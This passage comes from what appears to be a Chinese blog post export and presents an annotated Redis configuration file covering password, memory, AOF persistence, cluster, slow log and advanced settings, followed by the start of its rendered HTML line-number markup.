10.   \n\n################################## 安全 ###################################\n \n# 设置客户端连接后进行任何其他指定前需要使用的密码。\n# 警告：因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行150K次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解\n#\nrequirepass foobared\n \n# 命令重命名.\n#\n# 在一个共享环境下可以重命名相对危险的命令。比如把CONFIG重名为一个不容易猜测的字符。\n#\n# 举例:\n#\n# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52\n#\n# 如果想删除一个命令，直接把它重命名为一个空字符\"\"即可，如下：\n#\n# rename-command CONFIG \"\"\n#\n# Please note that changing the name of commands that are logged into the\n# AOF file or transmitted to slaves may cause problems.\n\n\n################################### 约束 ####################################\n \n# 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，\n# 如果设置 maxclients 0，表示不作限制。\n# 当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息\n#\n# maxclients 128\n \n# 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key\n# Redis同时也会移除空的list对象\n#\n# 当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作\n# \n# 注意：Redis新的vm机制，会把Key存放内存，Value会存放在swap区\n#\n# maxmemory的设置比较适合于把redis当作于类似memcached的缓存来使用，而不适合当做一个真实的DB。\n# 当把Redis当做一个真实的数据库使用的时候，内存使用将是一个很大的开销\n# maxmemory <bytes>\n \n# 当内存达到最大值的时候Redis会选择删除哪些数据？有五种方式可供选择\n# \n# volatile-lru -> 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )\n# allkeys-lru -> 利用LRU算法移除任何key\n# volatile-random -> 移除设置过过期时间的随机key\n# allkeys->random -> remove a random key, any key\n# volatile-ttl -> 移除即将过期的key(minor TTL)\n# noeviction -> 不移除任何可以，只是返回一个写错误\n# \n# 注意：对于上面的策略，如果没有合适的key可以移除，当写的时候Redis会返回一个错误\n#\n#       写命令包括: set setnx setex append\n#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd\n#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby\n#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby\n#       getset mset msetnx exec sort\n#\n# 默认是:\n#\n# maxmemory-policy volatile-lru\n \n# LRU 和 minimal TTL 算法都不是精准的算法，但是相对精确的算法(为了节省内存)，随意你可以选择样本大小进行检测。\n# Redis默认的灰选择3个样本进行检测，你可以通过maxmemory-samples进行设置\n#\n# maxmemory-samples 3\n\n#################################### AOF ####################################\n \n# 默认情况下，redis会在后台异步的把数据库镜像备份到磁盘，但是该备份是非常耗时的，而且备份也不能很频繁，如果发生诸如拉闸限电、拔插头等状况，那么将造成比较大范围的数据丢失。\n# 所以redis提供了另外一种更加高效的数据库备份及灾难恢复方式。\n# 开启append only模式之后，redis会把所接收到的每一次写操作请求都追加到appendonly.aof文件中，当redis重新启动时，会从该文件恢复出之前的状态。\n# 但是这样会造成appendonly.aof文件过大，所以redis还支持了BGREWRITEAOF指令，对appendonly.aof 进行重新整理。\n# 你可以同时开启asynchronous dumps 和 AOF\n \nappendonly no\n \n# AOF文件名称 (默认: \"appendonly.aof\")\n# appendfilename appendonly.aof\n \n \n# Redis支持三种同步AOF文件的策略:\n#\n# no: 不进行同步，系统去操作 . Faster.\n# always: always表示每次有写操作都进行同步. Slow, Safest.\n# everysec: 表示对写操作进行累积，每秒同步一次. Compromise.\n#\n# 默认是\"everysec\"，按照速度和安全折中这是最好的。\n# 如果想让Redis能更高效的运行，你也可以设置为\"no\"，让操作系统决定什么时候去执行\n# 或者相反想让数据更安全你也可以设置为\"always\"\n#\n# 如果不确定就用 \"everysec\".\n \n# appendfsync always\nappendfsync everysec\n# appendfsync no\n \n# AOF策略设置为always或者everysec时，后台处理进程(后台保存或者AOF日志重写)会执行大量的I/O操作\n# 在某些Linux配置中会阻止过长的fsync()请求。注意现在没有任何修复，即使fsync在另外一个线程进行处理\n#\n# 为了减缓这个问题，可以设置下面这个参数no-appendfsync-on-rewrite\n#\n# This means that while another child is saving the durability of Redis is\n# the same as \"appendfsync none\", that in pratical terms means that it is\n# possible to lost up to 30 seconds of log in the worst scenario (with the\n# default Linux settings).\n# \n# If you have latency problems turn this to \"yes\". Otherwise leave it as\n# \"no\" that is the safest pick from the point of view of durability.\nno-appendfsync-on-rewrite no\n \n# Automatic rewrite of the append only file.\n# AOF 自动重写\n# 当AOF文件增长到一定大小的时候Redis能够调用 BGREWRITEAOF 对日志文件进行重写 \n# \n# 它是这样工作的：Redis会记住上次进行些日志后文件的大小(如果从开机以来还没进行过重写，那日子大小在开机的时候确定)\n#\n# 基础大小会同现在的大小进行比较。如果现在的大小比基础大小大制定的百分比，重写功能将启动\n# 同时需要指定一个最小大小用于AOF重写，这个用于阻止即使文件很小但是增长幅度很大也去重写AOF文件的情况\n# 设置 percentage 为0就关闭这个特性\n \n \nauto-aof-rewrite-percentage 100\nauto-aof-rewrite-min-size 64mb\n\n############################## LUA SCRIPTING  ###############################\n \n# Max execution time of a Lua script in milliseconds.\n#\n# If the maximum execution time is reached Redis will log that a script is\n# still in execution after the maximum allowed time and will start to\n# reply to queries with an error.\n#\n# When a long running script exceed the maximum execution time only the\n# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be\n# used to stop a script that did not yet called write commands. The second\n# is the only way to shut down the server in the case a write commands was\n# already issue by the script but the user don't want to wait for the natural\n# termination of the script.\n#\n# Set it to 0 or a negative value for unlimited execution without warnings.\nlua-time-limit 5000\n\n################################ REDIS 集群  ###############################\n#\n# 启用或停用集群\n# cluster-enabled yes\n \n# Every cluster node has a cluster configuration file. This file is not\n# intended to be edited by hand. It is created and updated by Redis nodes.\n# Every Redis Cluster node requires a different cluster configuration file.\n# Make sure that instances running in the same system does not have\n# overlapping cluster configuration file names.\n#\n# cluster-config-file nodes-6379.conf\n \n# Cluster node timeout is the amount of milliseconds a node must be unreachable \n# for it to be considered in failure state.\n# Most other internal time limits are multiple of the node timeout.\n#\n# cluster-node-timeout 15000\n \n# A slave of a failing master will avoid to start a failover if its data\n# looks too old.\n#\n# There is no simple way for a slave to actually have a exact measure of\n# its \"data age\", so the following two checks are performed:\n#\n# 1) If there are multiple slaves able to failover, they exchange messages\n#    in order to try to give an advantage to the slave with the best\n#    replication offset (more data from the master processed).\n#    Slaves will try to get their rank by offset, and apply to the start\n#    of the failover a delay proportional to their rank.\n#\n# 2) Every single slave computes the time of the last interaction with\n#    its master. This can be the last ping or command received (if the master\n#    is still in the \"connected\" state), or the time that elapsed since the\n#    disconnection with the master (if the replication link is currently down).\n#    If the last interaction is too old, the slave will not try to failover\n#    at all.\n#\n# The point \"2\" can be tuned by user. Specifically a slave will not perform\n# the failover if, since the last interaction with the master, the time\n# elapsed is greater than:\n#\n#   (node-timeout * slave-validity-factor) + repl-ping-slave-period\n#\n# So for example if node-timeout is 30 seconds, and the slave-validity-factor\n# is 10, and assuming a default repl-ping-slave-period of 10 seconds, the\n# slave will not try to failover if it was not able to talk with the master\n# for longer than 310 seconds.\n#\n# A large slave-validity-factor may allow slaves with too old data to failover\n# a master, while a too small value may prevent the cluster from being able to\n# elect a slave at all.\n#\n# For maximum availability, it is possible to set the slave-validity-factor\n# to a value of 0, which means, that slaves will always try to failover the\n# master regardless of the last time they interacted with the master.\n# (However they'll always try to apply a delay proportional to their\n# offset rank).\n#\n# Zero is the only value able to guarantee that when all the partitions heal\n# the cluster will always be able to continue.\n#\n# cluster-slave-validity-factor 10\n \n# Cluster slaves are able to migrate to orphaned masters, that are masters\n# that are left without working slaves. This improves the cluster ability\n# to resist to failures as otherwise an orphaned master can't be failed over\n# in case of failure if it has no working slaves.\n#\n# Slaves migrate to orphaned masters only if there are still at least a\n# given number of other working slaves for their old master. This number\n# is the \"migration barrier\". A migration barrier of 1 means that a slave\n# will migrate only if there is at least 1 other working slave for its master\n# and so forth. It usually reflects the number of slaves you want for every\n# master in your cluster.\n#\n# Default is 1 (slaves migrate only if their masters remain with at least\n# one slave). To disable migration just set it to a very large value.\n# A value of 0 can be set but is useful only for debugging and dangerous\n# in production.\n#\n# cluster-migration-barrier 1\n \n# In order to setup your cluster make sure to read the documentation\n# available at http://redis.io web site.\n\n################################## SLOW LOG ###################################\n \n# Redis Slow Log 记录超过特定执行时间的命令。执行时间不包括I/O计算比如连接客户端，返回结果等，只是命令执行时间\n# \n# 可以通过两个参数设置slow log：一个是告诉Redis执行超过多少时间被记录的参数slowlog-log-slower-than(微妙)，\n# 另一个是slow log 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除\n \n \n# 下面的时间以微妙微单位，因此1000000代表一分钟。\n# 注意制定一个负数将关闭慢日志，而设置为0将强制每个命令都会记录\nslowlog-log-slower-than 10000\n \n \n# 对日志长度没有限制，只是要注意它会消耗内存\n# 可以通过 SLOWLOG RESET 回收被慢日志消耗的内存\nslowlog-max-len 102\n\n############################# Event notification ##############################\n \n# Redis can notify Pub/Sub clients about events happening in the key space.\n# This feature is documented at http://redis.io/topics/keyspace-events\n# \n# For instance if keyspace events notification is enabled, and a client\n# performs a DEL operation on key \"foo\" stored in the Database 0, two\n# messages will be published via Pub/Sub:\n#\n# PUBLISH __keyspace@0__:foo del\n# PUBLISH __keyevent@0__:del foo\n#\n# It is possible to select the events that Redis will notify among a set\n# of classes. Every class is identified by a single character:\n#\n#  K     Keyspace events, published with __keyspace@<db>__ prefix.\n#  E     Keyevent events, published with __keyevent@<db>__ prefix.\n#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...\n#  $     String commands\n#  l     List commands\n#  s     Set commands\n#  h     Hash commands\n#  z     Sorted set commands\n#  x     Expired events (events generated every time a key expires)\n#  e     Evicted events (events generated when a key is evicted for maxmemory)\n#  A     Alias for g$lshzxe, so that the \"AKE\" string means all the events.\n#\n#  The \"notify-keyspace-events\" takes as argument a string that is composed\n#  by zero or multiple characters. The empty string means that notifications\n#  are disabled at all.\n#\n#  Example: to enable list and generic events, from the point of view of the\n#           event name, use:\n#\n#  notify-keyspace-events Elg\n#\n#  Example 2: to get the stream of the expired keys subscribing to channel\n#             name __keyevent@0__:expired use:\n#\n#  notify-keyspace-events Ex\n#\n#  By default all notifications are disabled because most users don't need\n#  this feature and the feature has some overhead. Note that if you don't\n#  specify at least one of K or E, no events will be delivered.\nnotify-keyspace-events \"\"\n\n############################### ADVANCED CONFIG ###############################\n \n# 当hash中包含超过指定元素个数并且最大的元素没有超过临界时，\n# hash将以一种特殊的编码方式（大大减少内存使用）来存储，这里可以设置这两个临界值\n# Redis Hash对应Value内部实际就是一个HashMap，实际这里会有2种不同实现，\n# 这个Hash的成员比较少时Redis为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的HashMap结构，对应的value redisObject的encoding为zipmap,\n# 当成员数量增大时会自动转成真正的HashMap,此时encoding为ht。\nhash-max-zipmap-entries 512\nhash-max-zipmap-value 64\n \n# list数据类型多少节点以下会采用去指针的紧凑存储格式。\n# list数据类型节点值大小小于多少字节会采用紧凑存储格式。\nlist-max-ziplist-entries 512\nlist-max-ziplist-value 64\n \n# set数据类型内部数据如果全部是数值型，且包含多少节点以下会采用紧凑格式存储。\nset-max-intset-entries 512\n \n# zsort数据类型多少节点以下会采用去指针的紧凑存储格式。\n# zsort数据类型节点值大小小于多少字节会采用紧凑存储格式。\nzset-max-ziplist-entries 128\nzset-max-ziplist-value 64\n \n \n# Redis将在每100毫秒时使用1毫秒的CPU时间来对redis的hash表进行重新hash，可以降低内存的使用\n# \n# 当你的使用场景中，有非常严格的实时性需要，不能够接受Redis时不时的对请求有2毫秒的延迟的话，把这项配置为no。\n#\n# 如果没有这么严格的实时性要求，可以设置为yes，以便能够尽可能快的释放内存\nactiverehashing yes\n\n# HyperLogLog sparse representation bytes limit. The limit includes the\n# 16 bytes header. When an HyperLogLog using the sparse representation crosses\n# this limit, it is converted into the dense representation.\n#\n# A value greater than 16000 is totally useless, since at that point the\n# dense representation is more memory efficient.\n# \n# The suggested value is ~ 3000 in order to have the benefits of\n# the space efficient encoding without slowing down too much PFADD,\n# which is O(N) with the sparse encoding. The value can be raised to\n# ~ 10000 when CPU is not a concern, but space is, and the data set is\n# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.\nhll-sparse-max-bytes 3000\n\n# The client output buffer limits can be used to force disconnection of clients\n# that are not reading data from the server fast enough for some reason (a\n# common reason is that a Pub/Sub client can't consume messages as fast as the\n# publisher can produce them).\n#\n# The limit can be set differently for the three different classes of clients:\n#\n# normal -> normal clients\n# slave  -> slave clients and MONITOR clients\n# pubsub -> clients subscribed to at least one pubsub channel or pattern\n#\n# The syntax of every client-output-buffer-limit directive is the following:\n#\n# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>\n#\n# A client is immediately disconnected once the hard limit is reached, or if\n# the soft limit is reached and remains reached for the specified number of\n# seconds (continuously).\n# So for instance if the hard limit is 32 megabytes and the soft limit is\n# 16 megabytes / 10 seconds, the client will get disconnected immediately\n# if the size of the output buffers reach 32 megabytes, but will also get\n# disconnected if the client reaches 16 megabytes and continuously overcomes\n# the limit for 10 seconds.\n#\n# By default normal clients are not limited because they don't receive data\n# without asking (in a push way), but just after a request, so only\n# asynchronous clients may create a scenario where data is requested faster\n# than it can read.\n#\n# Instead there is a default limit for pubsub and slave clients, since\n# subscribers and slaves receive data in a push fashion.\n#\n# Both the hard or the soft limit can be disabled by setting them to zero.\nclient-output-buffer-limit normal 0 0 0\nclient-output-buffer-limit slave 256mb 64mb 60\nclient-output-buffer-limit pubsub 32mb 8mb 60\n \n# Redis calls an internal function to perform many background tasks, like\n# closing connections of clients in timeout, purging expired keys that are\n# never requested, and so forth.\n#\n# Not all tasks are performed with the same frequency, but Redis checks for\n# tasks to perform accordingly to the specified \"hz\" value.\n#\n# By default \"hz\" is set to 10. Raising the value will use more CPU when\n# Redis is idle, but at the same time will make Redis more responsive when\n# there are many keys expiring at the same time, and timeouts may be\n# handled with more precision.\n#\n# The range is between 1 and 500, however a value over 100 is usually not\n# a good idea. Most users should use the default of 10 and raise this up to\n# 100 only in environments where very low latency is required.\nhz 10\n \n# When a child rewrites the AOF file, if the following option is enabled\n# the file will be fsync-ed every 32 MB of data generated. This is useful\n# in order to commit the file to the disk more incrementally and avoid\n# big latency spikes.\naof-rewrite-incremental-fsync yes\n \n################################## INCLUDES ###################################\n \n# 假如说你有一个可用于所有的 redis server 的标准配置模板，\n# 但针对某些 server 又需要一些个性化的设置，\n# 你可以使用 include 来包含一些其他的配置文件，这对你来说是非常有用的。\n#\n# 但是要注意哦，include 是不能被 config rewrite 命令改写的\n# 由于 redis 总是以最后的加工线作为一个配置指令值，所以你最好是把 include 放在这个文件的最前面，\n# 以避免在运行时覆盖配置的改变，相反，你就把它放在后面（外国人真啰嗦）。\n#\n# include /path/to/local.conf\n# include /path/to/other.conf\n\n```","slug":"Redis配置文件详解","published":1,"updated":"2016-11-20T03:17:19.797Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulc9002bgwtmgtagzgr6","content":"<p><strong>REDIS &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;:</strong><br><a id=\"more\"></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span 